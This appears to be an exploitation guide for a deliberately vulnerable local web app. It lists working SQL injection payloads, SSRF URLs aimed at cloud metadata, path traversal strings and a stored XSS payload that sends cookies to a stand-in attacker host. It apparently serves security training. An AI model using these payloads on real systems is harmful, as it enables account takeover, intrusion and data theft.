Vulnerability Exploitation Guide

1. SQL Injection (Critical)

Location: Login, Search, Password Reset

Impact: Authentication bypass, data exfiltration

Payloads:

  • admin' OR '1'='1'--
  • ' UNION SELECT * FROM users--
  • ' AND 1=2 UNION SELECT id,username,password,email,role,bio FROM users--

2. Server-Side Request Forgery (Critical)

Location: Import GitHub Repository

Impact: Access internal services, cloud metadata, port scanning

Payloads:

  • http://127.0.0.1:3000/api/debug/info
  • http://169.254.169.254/latest/meta-data/
  • http://localhost:3000/api/users/search?q=

3. Stored XSS (High)

Location: User Bio field

Impact: Session hijacking, cookie theft

Payloads:

  • <script>alert(document.cookie)</script>
  • <img src=x onerror="fetch('http://attacker.com?c='+document.cookie)">

4. Path Traversal (High)

Location: File Browser

Impact: Source code disclosure, sensitive file access

Payloads:

  • ../server.js
  • ../package.json
  • ../../..

5. Non-Expiring Tokens (High)

Location: Password Reset

Impact: Account takeover

Exploitation: Tokens never expire and can be reused indefinitely

6. Information Disclosure (High)

Location: All error responses, /api/debug/info

Impact: Stack traces, environment variables, system info

Test: Visit http://localhost:3000/api/debug/info

7. Missing Security Headers (High)

Impact: XSS, clickjacking, MITM attacks

Missing Headers:

  • Content-Security-Policy
  • X-Frame-Options
  • Strict-Transport-Security
  • X-Content-Type-Options
